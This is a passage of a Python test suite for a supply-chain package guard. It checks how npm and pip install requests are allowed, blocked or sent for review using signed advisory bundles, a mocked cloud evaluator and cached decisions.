"""Behavior tests for local supply-chain package evaluation."""

from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
import threading
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import ClassVar

import pytest
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, generate_private_key

import codex_plugin_scanner.guard.runtime.supply_chain_package_eval as evaluator_module
from codex_plugin_scanner.guard.cli.oauth_client import generate_dpop_key_pair
from codex_plugin_scanner.guard.models import GuardAction
from codex_plugin_scanner.guard.runtime.package_intent_common import (
    PackageIntent,
    build_package_request_artifact,
    flag_tokens,
    js_target,
    python_target,
)
from codex_plugin_scanner.guard.runtime.package_manifest_diff import _DeadlineExceededError
from codex_plugin_scanner.guard.runtime.restricted_archive_download import RestrictedArchiveDownload
from codex_plugin_scanner.guard.runtime.runner import GuardSyncAuthorizationExpiredError
from codex_plugin_scanner.guard.runtime.supply_chain_package_eval import (
    PackageRequestEvaluation,
    SupplyChainUserCopy,
    _evidence_id,
    _with_additional_reason,
    _workspace_fingerprint,
    evaluate_package_request_artifact,
)
from codex_plugin_scanner.guard.store import GuardStore


def _seed_guard_cloud(store, *, workspace_id=None, sync_url=None, token="demo-token", now="2026-05-19T00:00:00Z"):
    """Seed OAuth credentials (replaces legacy set_sync_credentials scaffolding).

    Also installs a test-only resolver override so sync-path exercises stay hermetic
    (no OAuth token refresh against the network). Tests that need real sync against a
    local server pass sync_url=<url>.
    """
    from codex_plugin_scanner.guard.cli.oauth_client import generate_dpop_key_pair
    from codex_plugin_scanner.guard.runtime import runner as guard_runner_module

    dpop_key_material = generate_dpop_key_pair()
    store.set_oauth_local_credentials(
        issuer="https://hol.org",
        client_id="guard-local-daemon",
        refresh_token=token,
        dpop_private_key_pem=dpop_key_material.private_key_pem,
        dpop_public_jwk=dpop_key_material.public_jwk,
        dpop_public_jwk_thumbprint=dpop_key_material.public_jwk_thumbprint,
        grant_id="grant-1",
        machine_id="machine-1",
        workspace_id=workspace_id,
        now=now,
    )
    effective_sync_url = sync_url if sync_url is not None else "https://hol.org/api/guard/receipts/sync"
    guard_runner_module._test_sync_auth_context_override = {
        "sync_url": effective_sync_url,
        "access_token": token,
        "dpop_key_material": None,
    }


WORKSPACE_ID = "workspace-alpha"


def _force_cloud_fallback(monkeypatch: pytest.MonkeyPatch) -> None:
    def cloud_timeout(*args: object, **kwargs: object) -> object:
        del args, kwargs
        raise TimeoutError("cloud unreachable")

    monkeypatch.setattr(evaluator_module, "_urlopen_json_with_timeout_retry", cloud_timeout)


def _iso(value: datetime) -> str:
    return value.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def _generate_key_pair() -> tuple[bytes, bytes]:
    private_key = generate_private_key(public_exponent=65537, key_size=2048)
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return private_pem, public_pem


def _fingerprint(public_key_pem: bytes) -> str:
    return hashlib.sha256(public_key_pem.decode("utf-8").strip().encode("utf-8")).hexdigest()


def _bundle_response(
    *,
    packages: list[dict[str, object]],
    policy_rules: list[dict[str, object]] | None = None,
    bundle_version: str = "1747612800000-deadbeef",
    expires_at: datetime | None = None,
    generated_at: datetime | None = None,
    tier: str = "premium",
) -> dict[str, object]:
    generated = generated_at or datetime(2026, 5, 19, tzinfo=timezone.utc)
    expires = expires_at or (generated + timedelta(hours=12))
    bundle = {
        "advisories": [
            {
                "advisoryId": "GHSA-vh95-rmgr-6w4m",
                "aliases": ["CVE-2020-7598"],
                "confidence": 990,
                "exploitLevel": "active",
                "knownExploited": True,
                "malwareState": "known",
                "normalizedSeverity": "critical",
                "recommendedFixVersion": "1.2.9",
                "sourceKey": "ghsa",
                "summary": "Prototype pollution in minimist",
                "title": "Prototype pollution in minimist",
            }
        ],
        "bundleVersion": bundle_version,
        "expiresAt": _iso(expires),
        "feedSnapshotHash": "feed-snapshot-1",
        "generatedAt": _iso(generated),
        "keyId": "guard-bundle-key-2026-05",
        "packages": packages,
        "policyHash": "policy-hash-1",
        "policyRules": policy_rules or [],
        "scoringVersion": "scf-v1",
        "sourceHashes": [{"payloadHash": "ghsa-feed-hash", "sourceKey": "ghsa", "staleStatus": "fresh"}],
        "tier": tier,
        "workspaceId": WORKSPACE_ID,
    }
    private_key_pem, public_key_pem = _generate_key_pair()
    loaded_key = serialization.load_pem_private_key(private_key_pem, password=None)
    assert isinstance(loaded_key, RSAPrivateKey)
    canonical_payload = json.dumps(bundle, sort_keys=True, separators=(",", ":")).encode("utf-8")
    payload_hash = hashlib.sha256(canonical_payload).hexdigest()
    signature = loaded_key.sign(
        canonical_payload,
        padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
        hashes.SHA256(),
    )
    return {
        "bundle": bundle,
        "payloadHash": payload_hash,
        "signature": base64.b64encode(signature).decode("utf-8"),
        "signatureAlgorithm": "rsa-pss-sha256",
        "verificationKeys": [
            {
                "fingerprintSha256": _fingerprint(public_key_pem),
                "keyId": "guard-bundle-key-2026-05",
                "publicKeyPem": public_key_pem.decode("utf-8").strip(),
                "state": "active",
                "validUntil": None,
            }
        ],
    }


def _package(
    *,
    ecosystem: str,
    name: str,
    version: str,
    default_action: str,
    confidence: int = 990,
    normalized_severity: str = "critical",
    exploit_level: str = "active",
    known_exploited: bool = True,
    malware_state: str = "known",
    namespace: str | None = None,
    source_integrity_state: str = "high-risk",
    recommended_fix_version: str | None = None,
    risk_score: int = 980,
) -> dict[str, object]:
    return {
        "confidence": confidence,
        "defaultAction": default_action,
        "ecosystem": ecosystem,
        "exploitLevel": exploit_level,
        "knownExploited": known_exploited,
        "malwareState": malware_state,
        "name": name,
        "namespace": namespace,
        "normalizedSeverity": normalized_severity,
        "packageAgeState": "watch",
        "purl": f"pkg:{ecosystem}/{name}@{version}",
        "reachability": "reachable",
        "recommendedFixVersion": recommended_fix_version,
        "relatedAdvisoryIds": ["GHSA-vh95-rmgr-6w4m"],
        "riskScore": risk_score,
        "sourceIntegrityState": source_integrity_state,
        "version": version,
    }


def _artifact_for_targets(
    *targets: str,
    harness: str = "codex",
    package_manager: str = "npm",
    intent_kind: str = "install",
    manifest_paths: tuple[str, ...] = (),
    lockfile_paths: tuple[str, ...] = (),
    flags: tuple[str, ...] = (),
    notes: tuple[str, ...] = (),
    redacted_command: str | None = None,
) -> object:
    command_tokens = tuple([package_manager, intent_kind, *targets])
    intent = PackageIntent(
        package_manager=package_manager,
        intent_kind=intent_kind,
        command_tokens=command_tokens,
        redacted_command=redacted_command or " ".join(command_tokens),
        targets=tuple(js_target(target) for target in targets),
        manifest_paths=manifest_paths,
        lockfile_paths=lockfile_paths,
        flags=flags,
        notes=notes,
    )
    return build_package_request_artifact(harness, intent, config_path="codex.json", source_scope="project")


def _tarball_bytes(entries: list[tuple[str, bytes]]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for path, content in entries:
            info = tarfile.TarInfo(path)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
    return buffer.getvalue()


def _downloaded_archive(tmp_path: Path, payload: bytes) -> RestrictedArchiveDownload:
    archive_path = tmp_path / "downloaded-archive.blob"
    archive_path.write_bytes(payload)
    archive_path.chmod(0o400)
    return RestrictedArchiveDownload(
        path=archive_path,
        sha256=hashlib.sha256(payload).hexdigest(),
        size=len(payload),
        source_url="https://packages.example.com/archive.tgz",
        final_url="https://packages.example.com/archive.tgz",
    )


class _EvaluateHandler(BaseHTTPRequestHandler):
    captured_headers: ClassVar[dict[str, str]] = {}
    captured_requests: ClassVar[list[dict[str, object]]] = []
    response_code: ClassVar[int] = 200
    response_payload: ClassVar[dict[str, object]] = {}

    def do_POST(self) -> None:
        if self.path.startswith("/api/guard/supply-chain/evaluate"):
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8")
            self.__class__.captured_headers = {
                "Authorization": self.headers.get("Authorization", ""),
                "Content-Type": self.headers.get("Content-Type", ""),
            }
            self.__class__.captured_requests.append(json.loads(body))
            payload = json.dumps(self.__class__.response_payload).encode("utf-8")
            self.send_response(self.__class__.response_code)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(payload)
            return
        self.send_response(404)
        self.end_headers()

    def log_message(self, message_format: str, *args: object) -> None:
        del message_format, args


def _cloud_response(*, decision: str, enforcement: str, entitlement_state: str, package_name: str) -> dict[str, object]:
    return {
        "cacheStatus": "miss" if enforcement != "upgrade_required" else "upgrade-gated",
        "copy": {
            "ctaHref": "/guard/inbox",
            "ctaLabel": "Review evidence",
            "summary": f"{package_name} needs a safer version before you continue.",
            "title": "Critical install blocked" if decision == "block" else "Upgrade required for cloud evaluation",
        },
        "decision": decision,
        "enforcement": enforcement,
        "entitlementState": entitlement_state,
        "evidenceIds": ["evidence-1"],
        "expiresAt": "2026-05-19T00:15:00Z",
        "generatedAt": "2026-05-19T00:00:00Z",
        "packages": [
            {
                "advisoryIds": ["GHSA-vh95-rmgr-6w4m"],
                "decision": decision,
                "ecosystem": "npm",
                "name": package_name,
                "namespace": None,
                "reasons": [
                    {
                        "advisoryId": "GHSA-vh95-rmgr-6w4m",
                        "code": "known_advisory",
                        "message": "Prototype pollution in minimist",
                        "packageName": package_name,
                        "severity": "critical" if decision == "block" else "unknown",
                        "source": "ghsa",
                    }
                ],
                "recommendedFixVersion": "1.2.9" if decision == "block" else None,
                "requestedVersion": "1.2.8" if decision == "block" else None,
                "resolvedVersion": "1.2.8" if decision == "block" else None,
                "riskScore": 980 if decision == "block" else None,
                "sourceKeys": ["ghsa"] if decision == "block" else [],
                "sourceStale": False,
                "status": "known" if decision == "block" else "unknown",
            }
        ],
        "policyId": f"workspace:{WORKSPACE_ID}:supply-chain",
        "policyVersion": "policy-version-1",
        "reasons": [
            {
                "advisoryId": "GHSA-vh95-rmgr-6w4m",
                "code": "known_advisory" if decision == "block" else "upgrade_required",
                "message": "Prototype pollution in minimist"
                if decision == "block"
                else "Upgrade to a paid Guard workspace to unlock cloud package intelligence.",
                "packageName": package_name,
                "severity": "critical" if decision == "block" else "unknown",
                "source": "ghsa" if decision == "block" else "guard-cloud",
            }
        ],
        "recommendation": decision,
        "staleSources": [],
        "workspaceId": WORKSPACE_ID,
    }


def test_canonical_decision_order_prefers_cloud_over_signed_bundle(tmp_path: Path) -> None:
    _EvaluateHandler.captured_headers = {}
    _EvaluateHandler.captured_requests = []
    _EvaluateHandler.response_payload = _cloud_response(
        decision="monitor",
        enforcement="premium_cloud",
        entitlement_state="premium",
        package_name="minimist",
    )
    server = HTTPServer(("127.0.0.1", 0), _EvaluateHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        store = GuardStore(tmp_path / "guard-home")
        _seed_guard_cloud(
            store,
            workspace_id=WORKSPACE_ID,
            sync_url=f"http://127.0.0.1:{server.server_port}/api/guard/receipts/sync",
            token="demo-token",
        )
        bundle_response = _bundle_response(
            packages=[
                _package(
                    ecosystem="npm",
                    name="minimist",
                    version="1.2.8",
                    default_action="block",
                    recommended_fix_version="1.2.9",
                )
            ]
        )
        store.cache_supply_chain_bundle(WORKSPACE_ID, bundle_response, "2026-05-19T00:00:00Z")
        result = evaluate_package_request_artifact(
            artifact=_artifact_for_targets("minimist@1.2.8"),
            store=store,
            workspace_dir=tmp_path / "workspace",
            now="2026-05-19T00:00:00Z",
        )
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)

    assert _EvaluateHandler.captured_requests
    assert result.decision == "monitor"
    assert result.enforcement == "premium_cloud"
    assert result.policy_action == "allow"


def test_evaluate_package_request_artifact_posts_cloud_request_and_maps_block_response(tmp_path: Path) -> None:
    _EvaluateHandler.captured_headers = {}
    _EvaluateHandler.captured_requests = []
    _EvaluateHandler.response_payload = _cloud_response(
        decision="block",
        enforcement="premium_cloud",
        entitlement_state="premium",
        package_name="minimist",
    )
    server = HTTPServer(("127.0.0.1", 0), _EvaluateHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        store = GuardStore(tmp_path / "guard-home")
        _seed_guard_cloud(
            store,
            workspace_id=WORKSPACE_ID,
            sync_url=f"http://127.0.0.1:{server.server_port}/api/guard/receipts/sync",
            token="demo-token",
        )
        workspace_dir = tmp_path / "workspace"
        workspace_dir.mkdir()
        (workspace_dir / "package-lock.json").write_text(
            '{"packages":{"node_modules/minimist":{"version":"1.2.8"}}}', encoding="utf-8"
        )
        artifact = _artifact_for_targets("minimist@1.2.8", lockfile_paths=("package-lock.json",))

        result = evaluate_package_request_artifact(
            artifact=artifact,
            store=store,
            workspace_dir=workspace_dir,
            now="2026-05-19T00:00:00Z",
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)

    request_payload = _EvaluateHandler.captured_requests[0]
    assert _EvaluateHandler.captured_headers["Authorization"] == "Bearer demo-token"
    assert request_payload["commandShape"]["packageManager"] == "npm"
    assert request_payload["commandShape"]["verb"] == "install"
    assert request_payload["lockfileContext"]["fileName"] == "package-lock.json"
    assert request_payload["packages"][0]["name"] == "minimist"
    assert request_payload["packages"][0]["direct"] is True
    assert set(request_payload["packages"][0]) == {
        "direct",
        "ecosystem",
        "name",
        "namespace",
        "version",
    }
    assert request_payload["policyVersion"]
    assert request_payload["workspaceFingerprint"]
    assert result.decision == "block"
    assert result.policy_action == "block"
    assert result.enforcement == "premium_cloud"
    assert result.user_copy.title == "Critical install blocked"
    assert result.user_copy.summary == "minimist needs a safer version before you continue."
    assert result.user_copy.next_step == "npm install minimist@1.2.9"
    assert result.user_copy.dashboard_url is None
    assert "minimist@1.2.8" in result.user_copy.harness_message
    assert "npm install minimist@1.2.9" in result.user_copy.harness_message
    assert "Review this request in HOL Guard, then retry." not in result.user_copy.harness_message


def test_evaluate_package_request_artifact_posts_latest_range_for_unversioned_scoped_npm_request(
    tmp_path: Path,
) -> None:
    _EvaluateHandler.captured_headers = {}
    _EvaluateHandler.captured_requests = []
    _EvaluateHandler.response_payload = _cloud_response(
        decision="allow",
        enforcement="premium_cloud",
        entitlement_state="premium",
        package_name="cli",
    )
    server = HTTPServer(("127.0.0.1", 0), _EvaluateHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        store = GuardStore(tmp_path / "guard-home")
        _seed_guard_cloud(
            store,
            workspace_id=WORKSPACE_ID,
            sync_url=f"http://127.0.0.1:{server.server_port}/api/guard/receipts/sync",
            token="demo-token",
        )
        workspace_dir = tmp_path / "workspace"
        workspace_dir.mkdir()
        artifact = _artifact_for_targets(
            "@stripe/cli",
            flags=("-g",),
            manifest_paths=("package.json",),
            lockfile_paths=("package-lock.json",),
        )

        result = evaluate_package_request_artifact(
            artifact=artifact,
            store=store,
            workspace_dir=workspace_dir,
            now="2026-05-19T00:00:00Z",
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)

    request_payload = _EvaluateHandler.captured_requests[0]
    assert request_payload["packages"][0] == {
        "direct": True,
        "ecosystem": "npm",
        "name": "cli",
        "namespace": "@stripe",
        "range": "latest",
    }
    assert "lockfileContext" not in request_payload
    assert "workspaceContext" not in request_payload
    assert result.decision == "allow"


def test_global_false_package_request_keeps_workspace_context() -> None:
    artifact = _artifact_for_targets(
        "left-pad",
        flags=("--global=false",),
        manifest_paths=("package.json",),
        lockfile_paths=("package-lock.json",),
    )

    assert artifact.metadata["manifest_paths"] == ["package.json"]
    assert artifact.metadata["lockfile_paths"] == ["package-lock.json"]


def test_flag_tokens_preserves_global_boolean_values() -> None:
    assert flag_tokens(("install", "--global=false", "--location=project", "left-pad")) == (
        "--global=false",
        "--location=project",
    )
    assert flag_tokens(("install", "--location", "global", "left-pad")) == ("--location=global",)
    assert flag_tokens(("install", "--location", "project", "left-pad")) == ("--location=project",)


def test_merged_global_and_project_install_keeps_workspace_context() -> None:
    artifact = _artifact_for_targets(
        "eslint",
        "left-pad",
        flags=("-g",),
        notes=("multiple-package-segments",),
        manifest_paths=("package.json",),
        lockfile_paths=("package-lock.json",),
    )

    assert artifact.metadata["manifest_paths"] == ["package.json"]
    assert artifact.metadata["lockfile_paths"] == ["package-lock.json"]


def test_merged_all_global_installs_omit_workspace_context() -> None:
    artifact = _artifact_for_targets(
        "eslint",
        "typescript",
        flags=("-g",),
        notes=("multiple-package-segments",),
        manifest_paths=("package.json",),
        lockfile_paths=("package-lock.json",),
        redacted_command="npm install -g eslint ; npm install -g typescript",
    )

    assert artifact.metadata["manifest_paths"] == []
    assert artifact.metadata["lockfile_paths"] == []


def test_evaluate_package_request_artifact_reviews_npm_git_sources_before_cloud(
    tmp_path: Path,
) -> None:
    _EvaluateHandler.captured_headers = {}
    _EvaluateHandler.captured_requests = []
    _EvaluateHandler.response_payload = _cloud_response(
        decision="allow",
        enforcement="premium_cloud",
        entitlement_state="premium",
        package_name="pkg",
    )
    server = HTTPServer(("127.0.0.1", 0), _EvaluateHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        store = GuardStore(tmp_path / "guard-home")
        _seed_guard_cloud(
            store,
            workspace_id=WORKSPACE_ID,
            sync_url=f"http://127.0.0.1:{server.server_port}/api/guard/receipts/sync",
            token="demo-token",
        )
        workspace_dir = tmp_path / "workspace"
        workspace_dir.mkdir()
        artifact = _artifact_for_targets("git+https://github.com/org/pkg.git")

        result = evaluate_package_request_artifact(
            artifact=artifact,
            store=store,
            workspace_dir=workspace_dir,
            now="2026-05-19T00:00:00Z",
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)

    assert _EvaluateHandler.captured_requests == []
    assert result.decision == "ask"
    assert result.packages[0]["reasons"][0]["code"] == "git_dependency_source"
    assert result.packages[0]["sourceIdentity"] == "git:github.com/org/pkg#missing"


def test_evaluate_package_request_artifact_posts_open_range_for_unversioned_pypi_request(
    tmp_path: Path,
) -> None:
    _EvaluateHandler.captured_headers = {}
    _EvaluateHandler.captured_requests = []
    _EvaluateHandler.response_payload = _cloud_response(
        decision="allow",
        enforcement="premium_cloud",
        entitlement_state="premium",
        package_name="hol-guard",
    )
    server = HTTPServer(("127.0.0.1", 0), _EvaluateHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        store = GuardStore(tmp_path / "guard-home")
        _seed_guard_cloud(
            store,
            workspace_id=WORKSPACE_ID,
            sync_url=f"http://127.0.0.1:{server.server_port}/api/guard/receipts/sync",
            token="demo-token",
        )
        workspace_dir = tmp_path / "workspace"
        workspace_dir.mkdir()
        intent = PackageIntent(
            package_manager="pipx",
            intent_kind="install",
            command_tokens=("pipx", "install", "hol-guard", "--force"),
            redacted_command="pipx install hol-guard --force",
            targets=(python_target("hol-guard"),),
            manifest_paths=(),
            lockfile_paths=(),
            flags=("--force",),
            notes=(),
        )
        artifact = build_package_request_artifact(
            "guard-cli",
            intent,
            config_path="codex.json",
            source_scope="project",
        )

        result = evaluate_package_request_artifact(
            artifact=artifact,
            store=store,
            workspace_dir=workspace_dir,
            now="2026-05-19T00:00:00Z",
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)

    package_payload = _EvaluateHandler.captured_requests[0]["packages"][0]
    assert package_payload == {
        "direct": True,
        "ecosystem": "pypi",
        "name": "hol-guard",
        "namespace": None,
        "range": ">=0",
    }
    assert result.decision == "allow"


def test_evaluate_package_request_artifact_does_not_convert_pypi_source_specs_to_open_range(
    tmp_path: Path,
) -> None:
    _EvaluateHandler.captured_headers = {}
    _EvaluateHandler.captured_requests = []
    _EvaluateHandler.response_payload = _cloud_response(
        decision="allow",
        enforcement="premium_cloud",
        entitlement_state="premium",
        package_name="pkg",
    )
    server = HTTPServer(("127.0.0.1", 0), _EvaluateHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        store = GuardStore(tmp_path / "guard-home")
        _seed_guard_cloud(
            store,
            workspace_id=WORKSPACE_ID,
            sync_url=f"http://127.0.0.1:{server.server_port}/api/guard/receipts/sync",
            token="demo-token",
        )
        workspace_dir = tmp_path / "workspace"
        workspace_dir.mkdir()
        intent = PackageIntent(
            package_manager="pip",
            intent_kind="install",
            command_tokens=("pip", "install", "pkg @ git+https://github.com/org/pkg.git"),
            redacted_command="pip install 'pkg @ git+https://github.com/org/pkg.git'",
            targets=(python_target("pkg @ git+https://github.com/org/pkg.git"),),
            manifest_paths=(),
            lockfile_paths=(),
            flags=(),
            notes=(),
        )
        artifact = build_package_request_artifact(
            "guard-cli",
            intent,
            config_path="codex.json",
            source_scope="project",
        )

        evaluate_package_request_artifact(
            artifact=artifact,
            store=store,
            workspace_dir=workspace_dir,
            now="2026-05-19T00:00:00Z",
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)

    package_payload = _EvaluateHandler.captured_requests[0]["packages"][0]
    assert package_payload["name"] == "pkg"
    assert package_payload["sourceUrl"] == "git+https://github.com/org/pkg.git"
    assert "range" not in package_payload
    assert "version" not in package_payload


def test_evaluate_package_request_artifact_uses_cached_eval_before_network(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    artifact = _artifact_for_targets("minimist@1.2.8")
    workspace_dir = tmp_path / "workspace"
    package_intent_hash = str(artifact.artifact_id).rsplit(":", 1)[-1]
    store.cache_supply_chain_evaluation(
        workspace_id=WORKSPACE_ID,
        package_intent_hash=package_intent_hash,
        feed_snapshot_hash="feed-snapshot-1",
        policy_hash="policy-hash-1",
        scoring_version="scf-v1",
        bundle_version="1747612800000-deadbeef",
        decision={
            "decision": "block",
            "policy_action": "block",
            "enforcement": "offline_cached",
            "entitlement_state": "premium",
            "cache_status": "hit",
            "workspace_fingerprint": _workspace_fingerprint(
                WORKSPACE_ID,
                workspace_dir=workspace_dir,
                artifact=artifact,
                bundle_meta={"policy_hash": "policy-hash-1"},
            ),
            "reasons": [{"code": "known_malware_or_kev", "message": "Prototype pollution in minimist"}],
            "packages": [{"name": "minimist", "decision": "block", "recommendedFixVersion": "1.2.9"}],
            "matched_rule_id": None,
            "exception_id": None,
            "risk_summary": "HOL Guard blocked `minimist@1.2.8` before install.",
            "record_monitor_evidence": False,
            "user_copy": {
                "title": "Critical install blocked",
                "summary": "minimist needs a safer version before you continue.",
                "next_step": "npm install minimist@1.2.9",
                "dashboard_url": "https://hol.org/guard/inbox",
                "harness_message": (
                    "HOL Guard blocked `minimist@1.2.8` before install. "
                    "Fix: install `npm install minimist@1.2.9`. "
                    "Review evidence: https://hol.org/guard/inbox."
                ),
            },
        },
        now="2026-05-19T00:00:00Z",
    )

    def fail_urlopen(*args: object, **kwargs: object) -> object:
        raise AssertionError("cached evaluation should not call the network")

    monkeypatch.setattr(urllib.request, "urlopen", fail_urlopen)
    result = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.cache_status == "hit"
    assert result.user_copy.next_step == "npm install minimist@1.2.9"
    assert result.user_copy.dashboard_url is None
    assert "guard/inbox" not in result.user_copy.harness_message
    assert "Review evidence:" not in result.user_copy.harness_message
    assert "Review this request in HOL Guard, then retry." not in result.user_copy.harness_message


@pytest.mark.parametrize("policy_action", ["block", "sandbox-required"])
def test_normalize_package_user_copy_removes_review_routing_for_terminal_actions(
    policy_action: GuardAction,
) -> None:
    result = evaluator_module._normalize_package_user_copy(
        SupplyChainUserCopy(
            title="Terminal action",
            summary="HOL Guard stopped this package request.",
            next_step="npm install minimist@1.2.9",
            dashboard_url="http://127.0.0.1:5474/requests/request-1",
            harness_message=(
                "HOL Guard stopped this package request. "
                "Open HOL Guard to approve or keep this blocked: "
                "http://127.0.0.1:5474/requests/request-1. "
                "After you choose, retry the same Codex action. "
                "Review this request in HOL Guard, then retry."
            ),
        ),
        policy_action=policy_action,
    )

    assert result.dashboard_url is None
    assert result.harness_message == "HOL Guard stopped this package request."
    assert "/requests/" not in result.harness_message
    assert "Review this request in HOL Guard, then retry." not in result.harness_message


@pytest.mark.parametrize("policy_action", ["review", "require-reapproval"])
def test_normalize_package_user_copy_keeps_review_instruction_for_review_actions(
    policy_action: GuardAction,
) -> None:
    result = evaluator_module._normalize_package_user_copy(
        SupplyChainUserCopy(
            title="Review required",
            summary="HOL Guard paused this package request.",
            next_step=None,
            dashboard_url=None,
            harness_message="HOL Guard paused this package request.",
        ),
        policy_action=policy_action,
    )

    assert result.harness_message.endswith("Review this request in HOL Guard, then retry.")


def test_evaluate_package_request_artifact_skips_cached_eval_when_workspace_fingerprint_changes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    lockfile_path = workspace_dir / "package-lock.json"
    lockfile_path.write_text(
        '{"packages":{"node_modules/react":{"version":"18.0.0"},'
        '"node_modules/react/node_modules/minimist":{"version":"1.2.8"}}}',
        encoding="utf-8",
    )
    artifact = _artifact_for_targets("react@18.0.0", lockfile_paths=("package-lock.json",))

    initial = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )
    lockfile_path.write_text(
        '{"packages":{"node_modules/react":{"version":"18.0.0"}}}',
        encoding="utf-8",
    )
    refreshed = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:05Z",
    )

    assert initial.decision == "block"
    assert any("react/node_modules/minimist" in reason["message"] for reason in initial.reasons)
    assert refreshed.decision == "ask"
    assert refreshed.policy_action == "require-reapproval"
    assert refreshed.cache_status != "hit"
    assert all("react/node_modules/minimist" not in reason["message"] for reason in refreshed.reasons)


def test_evaluate_package_request_artifact_blocks_insecure_source_url_without_cloud(tmp_path: Path) -> None:
    store = GuardStore(tmp_path / "guard-home")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    artifact = _artifact_for_targets("demo@http://packages.example.com/demo-1.0.0.tgz")

    result = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert result.enforcement == "free_local"
    assert "http" in result.risk_summary.lower()


def test_evaluate_package_request_artifact_blocks_scoped_insecure_source_url_without_cloud(
    tmp_path: Path,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    artifact = _artifact_for_targets("@scope/demo@HTTP://packages.example.com/demo-1.0.0.tgz")

    result = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert result.enforcement == "free_local"
    assert "http" in result.risk_summary.lower()


def test_evaluate_package_request_artifact_handles_upgrade_required_with_premium_copy(tmp_path: Path) -> None:
    _EvaluateHandler.captured_requests = []
    _EvaluateHandler.response_payload = _cloud_response(
        decision="monitor",
        enforcement="upgrade_required",
        entitlement_state="free",
        package_name="left-pad",
    )
    server = HTTPServer(("127.0.0.1", 0), _EvaluateHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        store = GuardStore(tmp_path / "guard-home")
        _seed_guard_cloud(
            store,
            workspace_id=WORKSPACE_ID,
            sync_url=f"http://127.0.0.1:{server.server_port}/api/guard/receipts/sync",
            token="demo-token",
        )
        artifact = _artifact_for_targets("left-pad@1.0.0")

        result = evaluate_package_request_artifact(
            artifact=artifact,
            store=store,
            workspace_dir=tmp_path / "workspace",
            now="2026-05-19T00:00:00Z",
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)

    assert result.decision == "monitor"
    assert result.policy_action == "allow"
    assert result.enforcement == "upgrade_required"
    assert "upgrade" in result.user_copy.title.lower()


@pytest.mark.parametrize("status_code", [400, 401, 403, 404])
def test_evaluate_package_request_artifact_distinguishes_auth_from_validation_http_errors(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    status_code: int,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    def raise_http_error(*args: object, **kwargs: object) -> object:
        raise urllib.error.HTTPError(
